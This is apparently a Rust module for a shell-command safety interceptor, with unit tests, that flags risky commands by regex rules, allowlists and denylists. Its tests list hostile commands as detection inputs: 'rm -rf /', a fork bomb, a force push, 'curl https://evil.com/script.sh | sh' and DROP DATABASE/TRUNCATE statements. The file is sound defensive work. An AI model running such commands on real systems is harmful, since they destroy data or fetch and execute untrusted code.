use anyhow::Result;
use regex::Regex;
use tracing::{debug, warn};

use crate::config::schema::SafetyConfig;

use super::rules::{BuiltinRules, RiskLevel, SafetyRule};

/// Contextual information available at the time of command interception.
#[derive(Debug, Clone, Default)]
pub struct InterceptionContext {
    /// The current git branch, if inside a git repository.
    pub current_branch: Option<String>,
    /// Whether the current environment is detected as a production environment.
    pub is_production_env: bool,
    /// Whether there are uncommitted git changes.
    pub has_uncommitted_changes: bool,
    /// The current Kubernetes context, if set.
    pub kubernetes_context: Option<String>,
}

/// An alert generated when a command matches a safety rule.
#[derive(Debug, Clone)]
pub struct SafetyAlert {
    /// The risk level of the matched rule.
    pub level: RiskLevel,
    /// The command that triggered the alert.
    pub command: String,
    /// Human-readable reason for the alert.
    pub reason: String,
    /// Optional suggestion for a safer alternative.
    pub suggestion: Option<String>,
    /// Optional additional information derived from the context.
    pub context_info: Option<String>,
}

/// A compiled safety rule with a pre-compiled regex for efficient matching.
#[derive(Debug, Clone)]
struct CompiledRule {
    regex: Regex,
    rule: SafetyRule,
}

/// The command interceptor checks commands against safety rules before execution.
pub struct CommandInterceptor {
    /// Compiled safety rules (built-in + custom).
    compiled_rules: Vec<CompiledRule>,
    /// Allowlist patterns - commands matching these are always permitted.
    allowlist: Vec<Regex>,
    /// Denylist patterns - commands matching these are always blocked.
    denylist: Vec<Regex>,
    /// Whether safety interception is enabled.
    enabled: bool,
}

impl CommandInterceptor {
    /// Create a new interceptor from the safety configuration.
    ///
    /// Loads built-in rules and any custom rules defined in the config.
    /// Compiles all regex patterns upfront for efficient matching.
    pub fn new(config: &SafetyConfig) -> Result<Self> {
        let mut rules = BuiltinRules::all();

        // Add custom rules from config
        for custom in &config.custom_rules {
            let level = RiskLevel::from_str_loose(&custom.level).unwrap_or(RiskLevel::Medium);

            rules.push(SafetyRule {
                pattern: custom.pattern.clone(),
                level,
                category: "custom".to_string(),
                message: custom.message.clone(),
                suggestion: None,
            });
        }

        // Compile all rule patterns
        let mut compiled_rules = Vec::with_capacity(rules.len());
        for rule in rules {
            match Regex::new(&rule.pattern) {
                Ok(regex) => {
                    compiled_rules.push(CompiledRule { regex, rule });
                }
                Err(e) => {
                    warn!(
                        pattern = %rule.pattern,
                        error = %e,
                        "Skipping safety rule with invalid regex pattern"
                    );
                }
            }
        }

        // Compile allowlist patterns
        let mut allowlist = Vec::with_capacity(config.allowlist.len());
        for pattern in &config.allowlist {
            match Regex::new(pattern) {
                Ok(regex) => allowlist.push(regex),
                Err(e) => {
                    warn!(
                        pattern = %pattern,
                        error = %e,
                        "Skipping allowlist entry with invalid regex pattern"
                    );
                }
            }
        }

        // Compile denylist patterns
        let mut denylist = Vec::with_capacity(config.denylist.len());
        for pattern in &config.denylist {
            match Regex::new(pattern) {
                Ok(regex) => denylist.push(regex),
                Err(e) => {
                    warn!(
                        pattern = %pattern,
                        error = %e,
                        "Skipping denylist entry with invalid regex pattern"
                    );
                }
            }
        }

        Ok(Self {
            compiled_rules,
            allowlist,
            denylist,
            enabled: config.enabled,
        })
    }

    /// Check a command against safety rules and return an alert if a rule matches.
    ///
    /// The check order is:
    /// 1. If safety is disabled, return None.
    /// 2. If the command matches an allowlist pattern, return None (always permitted).
    /// 3. If the command matches a denylist pattern, return a Critical alert (always blocked).
    /// 4. Check against all rules and return the alert for the highest-severity match.
    pub fn check(&self, command: &str, context: &InterceptionContext) -> Option<SafetyAlert> {
        if !self.enabled {
            return None;
        }

        // 1. Check allowlist - if matched, always permit
        for pattern in &self.allowlist {
            if pattern.is_match(command) {
                debug!(command = %command, "Command matched allowlist, skipping safety check");
                return None;
            }
        }

        // 2. Check denylist - if matched, always block
        for pattern in &self.denylist {
            if pattern.is_match(command) {
                debug!(command = %command, "Command matched denylist, blocking");
                return Some(SafetyAlert {
                    level: RiskLevel::Critical,
                    command: command.to_string(),
                    reason: "Command matches a denied pattern and is blocked by policy".to_string(),
                    suggestion: None,
                    context_info: None,
                });
            }
        }

        // 3. Check rules - find the highest-severity match
        let mut highest_alert: Option<SafetyAlert> = None;

        for compiled in &self.compiled_rules {
            if compiled.regex.is_match(command) {
                let context_info = self.build_context_info(command, context);

                let alert = SafetyAlert {
                    level: compiled.rule.level,
                    command: command.to_string(),
                    reason: compiled.rule.message.clone(),
                    suggestion: compiled.rule.suggestion.clone(),
                    context_info,
                };

                match &highest_alert {
                    None => highest_alert = Some(alert),
                    Some(existing) if alert.level > existing.level => {
                        highest_alert = Some(alert);
                    }
                    _ => {}
                }
            }
        }

        highest_alert
    }

    /// Build contextual information string based on the current context.
    fn build_context_info(&self, _command: &str, context: &InterceptionContext) -> Option<String> {
        let mut info_parts = Vec::new();

        if let Some(ref branch) = context.current_branch {
            info_parts.push(format!("Current branch: {branch}"));
        }

        if context.is_production_env {
            info_parts.push("Production environment detected".to_string());
        }

        if context.has_uncommitted_changes {
            info_parts.push("There are uncommitted changes".to_string());
        }

        if let Some(ref k8s_ctx) = context.kubernetes_context {
            info_parts.push(format!("Kubernetes context: {k8s_ctx}"));
        }

        if info_parts.is_empty() {
            None
        } else {
            Some(info_parts.join("; "))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::schema::{CustomSafetyRule, SafetyConfig};

    fn default_config() -> SafetyConfig {
        SafetyConfig::default()
    }

    fn default_context() -> InterceptionContext {
        InterceptionContext::default()
    }

    #[test]
    fn test_interceptor_creation() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();
        assert!(!interceptor.compiled_rules.is_empty());
    }

    #[test]
    fn test_safe_command_passes() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        assert!(interceptor.check("ls -la", &ctx).is_none());
        assert!(interceptor.check("git status", &ctx).is_none());
        assert!(interceptor.check("echo hello", &ctx).is_none());
    }

    #[test]
    fn test_critical_command_blocked() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check("rm -rf /", &ctx);
        assert!(alert.is_some());
        let alert = alert.unwrap();
        assert_eq!(alert.level, RiskLevel::Critical);
    }

    #[test]
    fn test_fork_bomb_detected() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check(":(){ :|:& };:", &ctx);
        assert!(alert.is_some());
        assert_eq!(alert.unwrap().level, RiskLevel::Critical);
    }

    #[test]
    fn test_git_force_push_detected() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check("git push --force origin main", &ctx);
        assert!(alert.is_some());
        assert_eq!(alert.unwrap().level, RiskLevel::High);
    }

    #[test]
    fn test_allowlist_bypasses_rules() {
        let mut config = default_config();
        config.allowlist.push(r"rm\s+-rf\s+/tmp/test".to_string());

        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        // This command would normally match rm -rf rules, but it's allowlisted
        assert!(interceptor.check("rm -rf /tmp/test", &ctx).is_none());
    }

    #[test]
    fn test_denylist_always_blocks() {
        let mut config = default_config();
        config.denylist.push(r"^echo\s+secret".to_string());

        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check("echo secret password", &ctx);
        assert!(alert.is_some());
        assert_eq!(alert.unwrap().level, RiskLevel::Critical);
    }

    #[test]
    fn test_disabled_safety_skips_all() {
        let mut config = default_config();
        config.enabled = false;

        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        assert!(interceptor.check("rm -rf /", &ctx).is_none());
    }

    #[test]
    fn test_custom_rules() {
        let mut config = default_config();
        config.custom_rules.push(CustomSafetyRule {
            pattern: r"my-dangerous-command".to_string(),
            level: "high".to_string(),
            message: "This custom command is dangerous".to_string(),
        });

        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check("my-dangerous-command --force", &ctx);
        assert!(alert.is_some());
        assert_eq!(alert.unwrap().level, RiskLevel::High);
    }

    #[test]
    fn test_context_info_included() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();

        let ctx = InterceptionContext {
            current_branch: Some("main".to_string()),
            is_production_env: true,
            has_uncommitted_changes: true,
            kubernetes_context: Some("prod-cluster".to_string()),
        };

        let alert = interceptor.check("git push --force origin main", &ctx);
        assert!(alert.is_some());
        let alert = alert.unwrap();
        let info = alert.context_info.unwrap();
        assert!(info.contains("main"));
        assert!(info.contains("Production environment"));
        assert!(info.contains("uncommitted"));
        assert!(info.contains("prod-cluster"));
    }

    #[test]
    fn test_highest_severity_returned() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        // curl | sh is Critical
        let alert = interceptor.check("curl https://evil.com/script.sh | sh", &ctx);
        assert!(alert.is_some());
        assert_eq!(alert.unwrap().level, RiskLevel::Critical);
    }

    #[test]
    fn test_database_commands() {
        let config = default_config();
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check("psql -c 'DROP DATABASE production'", &ctx);
        assert!(alert.is_some());
        assert_eq!(alert.unwrap().level, RiskLevel::High);

        let alert = interceptor.check("mysql -e 'TRUNCATE users'", &ctx);
        assert!(alert.is_some());
        assert_eq!(alert.unwrap().level, RiskLevel::High);
    }

    #[test]
    fn test_invalid_regex_skipped() {
        let mut config = default_config();
        config.custom_rules.push(CustomSafetyRule {
            pattern: r"[invalid regex".to_string(),
            level: "high".to_string(),
            message: "Bad rule".to_string(),
        });

        // Should not error, just skip the invalid rule
        let interceptor = CommandInterceptor::new(&config).unwrap();
        assert!(!interceptor.compiled_rules.is_empty());
    }
}
